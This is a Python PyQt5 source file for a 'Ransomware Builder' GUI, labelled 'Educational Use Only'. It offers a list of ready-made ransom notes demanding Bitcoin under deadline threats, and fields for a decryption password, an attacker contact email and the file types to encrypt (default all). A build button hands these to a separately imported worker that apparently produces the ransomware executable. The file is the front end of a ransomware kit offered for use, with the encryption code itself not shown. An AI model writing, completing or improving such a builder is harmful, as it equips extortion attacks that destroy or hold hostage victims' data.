import re
from PyQt5.QtWidgets import QMainWindow, QVBoxLayout, QLabel, QLineEdit, QTextEdit, QPushButton, QWidget, QMessageBox, QComboBox, QProgressBar
from worker import RansomwareBuilderWorker
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

class RansomwareBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Ransomware Builder - Educational Use Only')
        self.setGeometry(100, 100, 400, 600)
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        layout = QVBoxLayout()

        font = QFont('Arial', 12)
        self.setFont(font)

        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(10)
        
        layout.addWidget(QLabel('Ransom Note Message:'))
        self.message_combo = QComboBox(self)
        self.message_combo.setPlaceholderText("Select a ransom note message or enter your own.")
        self.message_combo.addItem("All your files have been encrypted. Pay 1 Bitcoin to address X to get the decryption key.")
        self.message_combo.addItem("Your files are locked. Send 0.5 Bitcoin to address Y to retrieve your files.")
        self.message_combo.addItem("Important data encrypted. Transfer 2 Bitcoin to address Z for decryption instructions.")
        self.message_combo.addItem("Your files have been taken hostage. Pay 1 Bitcoin to free them.")
        self.message_combo.addItem("Critical files encrypted. Pay 0.75 Bitcoin to address Y to recover them.")
        self.message_combo.addItem("Pay 1.5 Bitcoin to address Z to decrypt your important files.")
        self.message_combo.addItem("Time is running out. Pay 2 Bitcoin to address A, or your files will be permanently deleted.")
        self.message_combo.addItem("Your system has been compromised. Pay 3 Bitcoin to address B to restore your files.")
        self.message_combo.addItem("Failure to pay 1 Bitcoin to address C within 24 hours will result in permanent data loss.")
        self.message_combo.addItem("Your files have been encrypted. Pay 1.5 Bitcoin to address D or risk losing everything.")
        self.message_combo.addItem("Your data is locked. Pay 2 Bitcoin to address E now to retrieve the decryption key.")
        self.message_combo.addItem("This is your final warning. Pay 1 Bitcoin to address F or all your files will be erased.")
        self.message_combo.addItem("Pay 2.5 Bitcoin to address G within 48 hours, or your files will be destroyed.")
        self.message_combo.addItem("Your most important files are encrypted. Pay 1 Bitcoin to address H to unlock them.")
        self.message_combo.addItem("Pay 3 Bitcoin to address I immediately to avoid permanent file deletion.")
        self.message_combo.addItem("Your files are at risk. Pay 2 Bitcoin to address J now or lose everything.")
        self.message_combo.addItem("Critical data encrypted. Pay 1 Bitcoin to address K to recover your files.")
        self.message_combo.addItem("Your data will be lost forever unless 1.5 Bitcoin is paid to address L within 24 hours.")
        self.message_combo.addItem("Act fast! Pay 2 Bitcoin to address M or face irreversible data loss.")
        self.message_combo.addItem("Pay 1 Bitcoin to address N to retrieve your encrypted files before they are deleted.")
        self.message_combo.addItem("Your system is under attack. Pay 2.5 Bitcoin to address O to restore your files immediately.")


        self.message_combo.currentIndexChanged.connect(self.update_ransom_message)
        layout.addWidget(self.message_combo)
        
        self.ransom_message = QTextEdit(self)
        self.ransom_message.setPlaceholderText("Enter your custom ransom note message here.")
        layout.addWidget(self.ransom_message)
        
        layout.addWidget(QLabel('Decryption Password:'))
        self.decryption_password = QLineEdit(self)
        self.decryption_password.setEchoMode(QLineEdit.Password)
        self.decryption_password.setPlaceholderText("Enter the decryption password (minimum 8 characters)")
        layout.addWidget(self.decryption_password)
        
        layout.addWidget(QLabel('Confirm Decryption Password:'))
        self.confirm_password = QLineEdit(self)
        self.confirm_password.setEchoMode(QLineEdit.Password)
        self.confirm_password.setPlaceholderText("Confirm the decryption password")
        layout.addWidget(self.confirm_password)
        
        layout.addWidget(QLabel('Your Email:'))
        self.email = QLineEdit(self)
        self.email.setPlaceholderText("Enter your email address for contact.")
        layout.addWidget(self.email)

        layout.addWidget(QLabel('File Extensions to Encrypt (default is ALL):'))
        self.file_extensions = QLineEdit(self)
        self.file_extensions.setPlaceholderText("e.g., .pdf,.jpeg (empty for all)")
        layout.addWidget(self.file_extensions)
        
        encryption_label = QLabel('Encryption: AES-256', self)
        encryption_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(encryption_label)
        
        build_button = QPushButton('Build Ransomware', self)
        build_button.clicked.connect(self.build_ransomware)
        layout.addWidget(build_button)
        
        self.progress_bar = QProgressBar(self)
        layout.addWidget(self.progress_bar)
        
        central_widget.setLayout(layout)

        self.setStyleSheet("""
            QWidget {
                background-color: #f7f7f7;
                color: #333;
            }
            QLabel {
                font-size: 14px;
                font-weight: bold;
            }
            QLineEdit, QTextEdit, QComboBox {
                padding: 5px;
                border: 1px solid #ccc;
                border-radius: 5px;
                background-color: #fff;
            }
            QLineEdit::placeholder, QTextEdit::placeholder {
                color: #888;
            }
            QPushButton {
                background-color: #4CAF50;
                color: white;
                padding: 10px;
                border: none;
                border-radius: 5px;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QProgressBar {
                height: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #4CAF50;
                width: 20px;
                border-radius: 5px;
            }
        """)

    def update_ransom_message(self):
        self.ransom_message.setPlainText(self.message_combo.currentText())
    
    def validate_email(self, email):
        regex = r'^\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        if re.match(regex, email):
            return True
        else:
            return False
    
    def build_ransomware(self):
        ransom_message = self.ransom_message.toPlainText()
        decryption_password = self.decryption_password.text()
        confirm_password = self.confirm_password.text()
        email = self.email.text().strip()
        extensions = self.file_extensions.text().strip()

        if not ransom_message or not decryption_password or not confirm_password or not email:
            QMessageBox.warning(self, 'Input Error', 'Please fill in all fields.')
            return
        
        if decryption_password != confirm_password:
            QMessageBox.warning(self, 'Password Error', 'Passwords do not match.')
            return
        
        if len(decryption_password) < 8:
            QMessageBox.warning(self, 'Password Error', 'Password must be at least 8 characters long.')
            return

        if not self.validate_email(email):
            QMessageBox.warning(self, 'Email Error', 'Please enter a valid email address.')
            return

        self.progress_bar.setValue(0)
        self.worker = RansomwareBuilderWorker(ransom_message, decryption_password, extensions, email)
        self.worker.progress.connect(self.update_progress)
        self.worker.finished.connect(self.on_build_complete)
        self.worker.start()
    
    def update_progress(self, value):
        self.progress_bar.setValue(value)
    
    def on_build_complete(self, success):
        if success:
            QMessageBox.information(self, 'Success', 'Ransomware built successfully. The executable is in the current directory.')
        else:
            QMessageBox.critical(self, 'Error', 'An error occurred during the build process.')
